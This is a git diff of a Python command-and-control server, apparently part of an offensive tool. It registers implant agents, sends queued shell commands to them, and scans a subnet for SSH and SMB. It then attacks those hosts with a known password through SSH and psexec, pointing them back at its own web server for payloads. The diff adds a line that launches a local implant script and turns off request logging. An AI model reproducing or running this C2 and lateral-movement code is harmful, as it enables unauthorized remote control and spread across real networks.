@@ -6,37 +6,60 @@ import queue
 import readline
 import logging
 from concurrent.futures import ThreadPoolExecutor
+import configparser
 
 # Custom imports
-import users
-import implants
-import attacks
+import modules.users as users
+import modules.implants as implants
+import modules.attacks as attacks
 
-# IP and port configs
-SERVER_HOST = "192.168.108.15"
-SERVER_PORT = 4444
-FLASK_HOST = "192.168.108.15"
-FLASK_PORT = 5000
-TARGET_SUBNET = "192.168.108."
+# Load config
+config = configparser.ConfigParser()
+config.read('server.conf')
 
-# C2 configs
-DELAY = 10
-JITTER = 2
+SERVER_HOST = config['network']['server_host']
+SERVER_PORT = int(config['network']['server_port'])
+FLASK_HOST = config['network']['flask_host']
+FLASK_PORT = int(config['network']['flask_port'])
+TARGET_SUBNET = config['network']['target_subnet']
 
-# Known password
-KNOWN_PW = "password"
+DELAY = int(config['c2']['delay'])
+JITTER = int(config['c2']['jitter'])
 
-# Flask stuff
+KNOWN_PW = config['auth']['known_pw']
+
+FLASK_SECRET_KEY = config['flask']['secret_key']
+
+# Flask app setup
 app = Flask(__name__)
-app.secret_key = "ac2_secret"
-#log = logging.getLogger('werkzeug')
-#log.disabled = True
+app.secret_key = FLASK_SECRET_KEY
+log = logging.getLogger('werkzeug')
+log.disabled = True
 
 # Set up server logging
-logger = logging.getLogger(__name__)
-if os.path.exists("server.log"):
-    os.remove("server.log")
-logging.basicConfig(filename='server.log', encoding='utf-8', format='%(asctime)s - %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p', level=logging.INFO)
+def setup_logger(logger_name, log_file, level=logging.INFO):
+    l = logging.getLogger(logger_name)
+    formatter = logging.Formatter(fmt='%(asctime)s - %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
+    fileHandler = logging.FileHandler(log_file, mode='w')
+    fileHandler.setFormatter(formatter)
+    streamHandler = logging.StreamHandler()
+    streamHandler.setFormatter(formatter)
+
+    l.setLevel(level)
+    l.addHandler(fileHandler)
+    l.addHandler(streamHandler)    
+
+logging.basicConfig(encoding='utf-8', level=logging.INFO)
+
+if os.path.exists("data/server.log"):
+    os.remove("data/server.log")
+setup_logger("server", "data/server.log")
+logger = logging.getLogger("server")
+
+if os.path.exists("data/attack.log"):
+    os.remove("data/attack.log")
+setup_logger("attack", "data/attack.log")
+atk_logger = logging.getLogger("attack")
 
 # Keep track of registered agents
 registered_addresses = set()
@@ -59,7 +82,7 @@ def handle_client(client_socket, client_address):
         try:
             # Get hostname
             command = "hostname; whoami" + "\n"
-            logging.info(f"[+] New agent connected ({client_address[0]}). Gathering info...")
+            logger.info(f"[+] New agent connected ({client_address[0]}). Gathering info...")
             client_socket.sendall(command.encode())
 
             # Receive output from the client until the delimiter
@@ -76,10 +99,14 @@ def handle_client(client_socket, client_address):
             # Register the agent
             registered_addresses.add(client_address[0])
             global curr_id
+            hostname = "?"
+            whoami = "?"
             if output:
                 split_output = output.split("\n")
                 hostname = split_output[0].strip()
                 whoami = split_output[1].strip()
+            else:
+                raise ValueError("No output received")
             new_agent = Agent(curr_id, client_address[0], hostname, whoami)
             curr_id += 1
             registered_agents_id.append(new_agent)
@@ -87,7 +114,7 @@ def handle_client(client_socket, client_address):
             logger.info(f"[+] Registered new agent {new_agent.hostname} ({new_agent.ip})")
 
         except Exception as e:
-            logger.error(f"[!] Error with client {client_address}: {e}")
+            logger.error(f"[!] Error with new client {client_address}: {e}")
         finally:
             client_socket.close()
     else:
@@ -98,7 +125,7 @@ def handle_client(client_socket, client_address):
                 if not agent.command_queue.empty():
                     # Get the next command from the queue
                     command = agent.command_queue.get()
-                    logging.info(f"[+] Sending command to <{agent.hostname}> ({agent.ip}): {command}")
+                    logger.info(f"[+] Sending command to <{agent.hostname}> ({agent.ip}): {command}")
                     client_socket.sendall(command.encode())
 
                     # Receive output from the client until the delimiter
@@ -173,31 +200,31 @@ def network_scan(subnet="192.168.108.", ports=[22, 445]):
                     if result == 0:
                         if port == 22:
                             ssh_hosts.append(ip)
-                            print(f"[INFO] SSH (port 22) open on {ip}. Potential SSH server.")
+                            atk_logger.info(f"[INFO] SSH (port 22) open on {ip}.")
                         elif port == 445:
                             smb_hosts.append(ip)
-                            print(f"[INFO] SMB (port 445) open on {ip}. Potential SMB service.")
+                            atk_logger.info(f"[INFO] SMB (port 445) open on {ip}.")
                     else:
                         # print(f"[DEBUG] Port {port} closed on {ip}.")
                         pass
             except Exception as e:
-                print(f"[ERROR] Error scanning {ip}:{port} - {e}")
+                atk_logger.error(f"[ERROR] Error scanning {ip}:{port} - {e}")
 
-    print("[INFO] Starting scan...")
+    atk_logger.info("[INFO] Starting scan...")
     with ThreadPoolExecutor(max_workers=20) as executor:
         ips = [f"{subnet}{i}" for i in range(1, 255)]
         executor.map(scan_host, ips)
-    print("[INFO] Scan completed.")
+    atk_logger.info("[INFO] Scan completed.")
 
     return ssh_hosts, smb_hosts
 
 def perform_attack():
     ssh_hosts, smb_hosts = network_scan(TARGET_SUBNET)
     for host in ssh_hosts:
-        print(f"Attempting ssh attack for {host}")
+        atk_logger.info(f"Attempting ssh attack for {host}")
         attacks.ssh("root", KNOWN_PW, host, FLASK_HOST, FLASK_PORT)
     for host in smb_hosts:
-        print(f"Attempting smb attack for {host}")
+        atk_logger.info(f"Attempting smb attack for {host}")
         attacks.psexec("Administrator", KNOWN_PW, host, FLASK_HOST, FLASK_PORT)
     
 
@@ -242,7 +269,8 @@ def logs():
         return redirect(url_for('login'))
 
     # Specify the path to your log file
-    log_file_path = 'server.log'
+    log_file_path = 'data/server.log'
+    attack_log_file_path = 'data/attack.log'
 
     # Read the contents of the log file
     try:
@@ -251,14 +279,23 @@ def logs():
     except FileNotFoundError:
         log_content = ["Log file not found."]
 
+    # Read the contents of the attack log file
+    try:
+        with open(attack_log_file_path, 'r') as file:
+            attack_log_content = file.readlines()
+    except FileNotFoundError:
+        attack_log_content = ["Attack log file not found."]
+
     # Render the log contents in the HTML template
-    return render_template('logs.html', log_content=log_content)
+    return render_template('logs.html', log_content=log_content, attack_log_content = attack_log_content)
 
 @app.route('/start_attack', methods=['POST'])
 def start_attack():
-    # Call your Python function here
+    # Start implant on server machine
+    os.system("bash static/lin &")
+
     perform_attack()
-    return "Attack initiated successfully!"
+    return "Attack initiated."
 
 @app.route('/logout')
 def logout():
@@ -302,7 +339,7 @@ def retrieve_output():
 
 if __name__ == '__main__':
     # Default creds
-    if not os.path.exists("creds.db"):
+    if not os.path.exists("data/creds.db"):
         users.register("admin", "admin")
 
     # Prepare implants in static/
